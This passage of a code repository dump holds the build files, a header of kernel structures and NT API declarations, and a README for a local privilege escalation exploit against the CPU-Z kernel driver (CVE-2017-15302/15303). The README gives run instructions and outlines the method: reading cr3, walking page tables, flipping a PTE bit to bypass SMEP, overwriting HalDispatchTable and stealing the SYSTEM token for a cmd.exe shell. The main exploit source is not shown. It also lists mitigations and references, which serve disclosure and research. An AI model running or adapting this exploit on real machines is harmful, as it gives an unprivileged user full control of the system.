  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v140</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v140</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v140</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v140</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <OutDir>$(SolutionDir)export\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>build\$(Platform)\$(Configuration)\</IntDir>
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <OutDir>$(SolutionDir)export\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>build\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <OutDir>$(SolutionDir)export\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>build\$(Platform)\$(Configuration)\</IntDir>
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <OutDir>$(SolutionDir)export\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>build\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
      <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
      <FunctionLevelLinking>true</FunctionLevelLinking>
    </ClCompile>
    <Link>
      <GenerateDebugInformation>Debug</GenerateDebugInformation>
      <SubSystem>Console</SubSystem>
      <FunctionOrder>order.txt</FunctionOrder>
    </Link>
    <PostBuildEvent>
      <Command>copy $(TargetPath) F:\Users\shareef12\Desktop\</Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
      <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
      <FunctionLevelLinking>true</FunctionLevelLinking>
    </ClCompile>
    <Link>
      <GenerateDebugInformation>Debug</GenerateDebugInformation>
      <SubSystem>Console</SubSystem>
      <FunctionOrder>order64.txt</FunctionOrder>
    </Link>
    <PostBuildEvent>
      <Command>copy $(TargetPath) F:\Users\shareef12\Desktop\</Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <SubSystem>Console</SubSystem>
      <FunctionOrder>order.txt</FunctionOrder>
      <LinkTimeCodeGeneration>UseLinkTimeCodeGeneration</LinkTimeCodeGeneration>
    </Link>
    <PostBuildEvent>
      <Command>copy $(TargetPath) F:\Users\shareef12\Desktop\</Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <SubSystem>Console</SubSystem>
      <FunctionOrder>order64.txt</FunctionOrder>
      <LinkTimeCodeGeneration>UseLinkTimeCodeGeneration</LinkTimeCodeGeneration>
    </Link>
    <PostBuildEvent>
      <Command>copy $(TargetPath) F:\Users\shareef12\Desktop\</Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="Exploit.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Internal.h" />
    <ClInclude Include="Cpuz.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Exploit/Exploit.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Exploit.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Internal.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Cpuz.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`Exploit/Internal.h`:

```h
#pragma once

#include <Windows.h>

// Ignore Macro redefinition warnings
#pragma warning(push)
#pragma warning(disable:4005)
#include <ntstatus.h>
#pragma warning(pop)

#define PAGE_SIZE   4096

#ifdef _X86_

#define PTI_SHIFT       12
#define PTI_SHIFT_PAE   12
#define PDI_SHIFT       22
#define PDI_SHIFT_PAE   21
#define PPI_SHIFT_PAE   30

#define PTE_MASK        0x3FF
#define PTE_MASK_PAE    0x1FF

#define PTE_OFFSET(Va)      ((Va >> PTI_SHIFT) & PTE_MASK)
#define PTE_OFFSET_PAE(Va)  ((Va >> PTI_SHIFT_PAE) & PTE_MASK_PAE)
#define PDE_OFFSET(Va)      ((Va >> PDI_SHIFT) & PTE_MASK)
#define PDE_OFFSET_PAE(Va)  ((Va >> PDI_SHIFT_PAE) & PTE_MASK_PAE)
#define PPE_OFFSET_PAE(Va)  ((Va >> PPI_SHIFT_PAE) & 3)

typedef struct _HARDWARE_PTE {
    ULONG Valid : 1;
    ULONG Write : 1;
    ULONG Owner : 1;
    ULONG WriteThrough : 1;
    ULONG CacheDisable : 1;
    ULONG Accessed : 1;
    ULONG Dirty : 1;
    ULONG LargePage : 1;
    ULONG Global : 1;
    ULONG CopyOnWrite : 1;          // software field
    ULONG Prototype : 1;            // software field
    ULONG reserved0 : 1;            // software field
    ULONG PageFrameNumber : 20;
} HARDWARE_PTE, *PHARDWARE_PTE;

typedef struct _HARDWARE_PTE_PAE {
    ULONG64 Valid : 1;
    ULONG64 Write : 1;
    ULONG64 Owner : 1;
    ULONG64 WriteThrough : 1;
    ULONG64 CacheDisable : 1;
    ULONG64 Accessed : 1;
    ULONG64 Dirty : 1;
    ULONG64 LargePage : 1;
    ULONG64 Global : 1;
    ULONG64 CopyOnWrite : 1;          // software field
    ULONG64 Prototype : 1;            // software field
    ULONG64 reserved0 : 1;            // software field
    ULONG64 PageFrameNumber : 26;
    ULONG64 reserved1 : 25;
    ULONG64 NoExecute : 1;
} HARDWARE_PTE_PAE, *PHARDWARE_PTE_PAE;

#else   // _AMD64_

#define PTI_SHIFT 12
#define PDI_SHIFT 21
#define PPI_SHIFT 30
#define PXI_SHIFT 39

#define PTE_MASK  0x1FF

#define PTE_OFFSET(Va)  ((Va >> PTI_SHIFT) & PTE_MASK)
#define PDE_OFFSET(Va)  ((Va >> PDI_SHIFT) & PTE_MASK)
#define PPE_OFFSET(Va)  ((Va >> PPI_SHIFT) & PTE_MASK)
#define PXE_OFFSET(Va)  ((Va >> PXI_SHIFT) & PTE_MASK)

#define _HARDWARE_PTE_WORKING_SET_BITS  11
typedef struct _HARDWARE_PTE {
    ULONG64 Valid : 1;
    ULONG64 Write : 1;
    ULONG64 Owner : 1;
    ULONG64 WriteThrough : 1;
    ULONG64 CacheDisable : 1;
    ULONG64 Accessed : 1;
    ULONG64 Dirty : 1;
    ULONG64 LargePage : 1;
    ULONG64 Global : 1;
    ULONG64 CopyOnWrite : 1;          // software field
    ULONG64 Prototype : 1;            // software field
    ULONG64 reserved0 : 1;            // software field
    ULONG64 PageFrameNumber : 28;
    ULONG64 reserved1 : 24 - (_HARDWARE_PTE_WORKING_SET_BITS + 1);
    ULONG64 SoftwareWsIndex : _HARDWARE_PTE_WORKING_SET_BITS;
    ULONG64 NoExecute : 1;
} HARDWARE_PTE, *PHARDWARE_PTE;

#endif

#define OBJ_KERNEL_HANDLE       0x00000200L
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
    PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE  UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(
    __in ULONG Value,
    __in PVOID Unknown);

typedef NTSTATUS(WINAPI *NtQuerySystemInformation_t)(
    __in ULONG SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength);

typedef NTSTATUS(NTAPI *ZwOpenProcess_t)(
    __out PHANDLE ProcessHandle,
    __in ACCESS_MASK DesiredAccess,
    __in POBJECT_ATTRIBUTES ObjectAttributes,
    __in_opt PCLIENT_ID ClientId);

typedef NTSTATUS(NTAPI *ZwOpenProcessTokenEx_t)(
    __in HANDLE ProcessHandle,
    __in ACCESS_MASK DesiredAccess,
    __in ULONG HandleAttributes,
    __out PHANDLE TokenHandle);

typedef NTSTATUS(NTAPI *ZwDuplicateToken_t)(
    __in HANDLE ExistingTokenHandle,
    __in ACCESS_MASK DesiredAccess,
    __in POBJECT_ATTRIBUTES ObjectAttributes,
    __in BOOLEAN EffectiveOnly,
    __in TOKEN_TYPE TokenType,
    __out PHANDLE NewTokenHandle);

typedef NTSTATUS(NTAPI *ZwSetInformationProcess_t)(
    __in HANDLE ProcessHandle,
    __in ULONG ProcessInformationClass,
    __in PVOID ProcessInformation,
    __in ULONG ProcessInformationLength);

#define ProcessAccessToken 9
typedef struct _PROCESS_ACCESS_TOKEN {
    HANDLE Token;
    HANDLE Thread;
} PROCESS_ACCESS_TOKEN, *PPROCESS_ACCESS_TOKEN;

#define SystemModuleInformation 11
typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG_PTR Reserved[2];
    PVOID Base;
    ULONG Size;
    ULONG Flags;
    USHORT Index;
    USHORT Unknown;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _SYSTEM_MODULES {
    ULONG Count;
    SYSTEM_MODULE_INFORMATION Modules[1];
} SYSTEM_MODULE, *PSYSTEM_MODULES;

```

`Exploit/order.txt`:

```txt
?Payload@@YGKKKKK@Z
?PayloadEnd@@YGKXZ
```

`Exploit/order64.txt`:

```txt
?Payload@@YAKKKKK@Z
?PayloadEnd@@YAKXZ
```

`README.md`:

```md
# CPU-Z Exploit (CVE-2017-15302 & CVE-2017-15303)

Local privilege escalation exploit for the CPU-Z kernel driver.

The CPU-Z application will install a vulnerable signed driver to access kernel
data from usermode. Before v1.81, the CPU-Z driver exposed three IOCTLs that
allow any usermode application to read control registers, read DWORDs from
physical memory, and write DWORDs to physical memory. We abuse this
functionality to gain full kernel mode code execution and spawn a SYSTEM shell
as a proof of concept.

This exploit supports Windows XP - Windows 10 1607:
 - x86
 - x86+PAE
 - x86\_64

This exploit was tested on the following systems with CPU-Z v1.76:
 - Windows 10 Kernel Version 10586 (x86 PAE) - 10586.162.x86fre.th2\_release\_sec.160223-1728
 - \*Windows 10 Kernel Version 16299 (x86\_64) - 16299.15.amd64fre.rs3\_release.170928-1534

\* On Windows 1703 and later kernel control flow guard (CFG) is enabled by
   default [1], resulting in a KERNEL\_SECURITY\_CHECK\_FAILURE bug check.


## Usage

To run this exploit, start the CPU-Z application, and run Exploit.exe from a
command prompt as a normal user. If successful, it should spawn a new cmd.exe
process running as SYSTEM. Note that this exploit will fail if run from a
low-integrity process due to the use of NtQuerySystemInformation.


## Implementation Details

The CPU-Z kernel driver before v1.81 allows any usermode application to read
control registers, read DWORDs from physical memory, and write DWORDs to
physical memory. We abuse this functionality to read cr3 and traverse the page
tables in order to build an arbitrary read/write primitive over the entire
virtual memory space.

With full read/write, we flip the user/supervisor bit on the page table entry
(PTE) containing our payload to KernelMode to bypass Supervisor Mode Execution
Prevention (SMEP). We then overwrite a function pointer at
nt!HalDispatchTable[1] and trigger the payload by calling
NtQueryIntervalProfile.

As a proof of concept, the payload will assign the SYSTEM token to a suspended
cmd.exe process, and resume the process. This should result in a new command
prompt running as NT Authority/System. The payload does not rely on static
offsets and should thus work on Windows XP+.


## Mitigations

A number of mitigations have been introduced over the last two years that limit
the effectiveness of this exploit. A brief description is below.

1. As of version 1.81, the driver provided with CPU-Z has been patched to limit
   the set of callers that can open its device object and some IOCTL
   implementations have been removed. On requests to open the driver's device
   object, it will check to see if the current process has the
   SeLoadDriverPrivilege enabled. If this privilige is missing or disabled, the
   driver will reject the request with STATUS\_ACCESS\_DENIED. Note that when
   running as an Administrator, it is trivial to enable this privilege from
   usermode. Furthermore, the IOCTL to read control registers has been removed
   (although the physical memory read/write implementations remain). Without the
   ability to read the page table base from cr3, the exploitation method in this
   project is no longer feasible. Note that the CPU-Z driver provides numerous
   other IOCTLs that could be used for exploitation, such as reading from and
   writing to arbitrary model-specific registers.

2. As of Windows 10 1703 (Creators Update), kernel control flow guard is
   enabled by default on x86\_64. Calls through the HalDispatchTable will
   result in a KERNEL\_SECURITY\_CHECK\_FAILURE bug check since it is
   protected by CFG. If Virtualization Based Security (VBS) is not enabled,
   it should be possible to add the payload as a valid call target to bypass
   CFG.

3. If Virtualization Based Security (VBS) is enabled it will kill the majority
   of this exploit. The PTE manipulation used to disable SMEP will no longer be
   possible, as the PTEs will be protected by the hypervisor. Additionally, a
   CFG bypass will be needed on x86\_64 to gain code execution through the
   HalDispatchTable since the kernel CFG bitmap will not be writable.


## Links

The vulnerabilities used in this exploit are detailed in CVE-2017-15302 and
CVE-2017-15303. Another proof of concept can be viewed at CPUZ-DSEFix [5].

[1] https://community.osr.com/discussion/283374/control-flow-guard-question  
[2] https://www.cvedetails.com/cve/CVE-2017-15302/  
[3] https://www.cvedetails.com/cve/CVE-2017-15303/  
[4] https://github.com/akayn/Bugs/blob/master/CPUID/CVE-2017-15302/README.md  
[5] https://github.com/SamLarenN/CPUZ-DSEFix  

Additionally, the HalDispatchTable overwrite method used in this exploit is a
commonly used vector to obtain code execution from a kernel read/write
primitive. For additional details on this technique, see the below resources.

[6] http://poppopret.blogspot.com/2011/07/windows-kernel-exploitation-basics-part.html  
[7] https://www.abatchy.com/2018/01/kernel-exploitation-7  
[8] https://osandamalith.com/2017/06/14/windows-kernel-exploitation-arbitrary-overwrite/  
[9] https://rootkits.xyz/blog/2017/09/kernel-write-what-where/  

```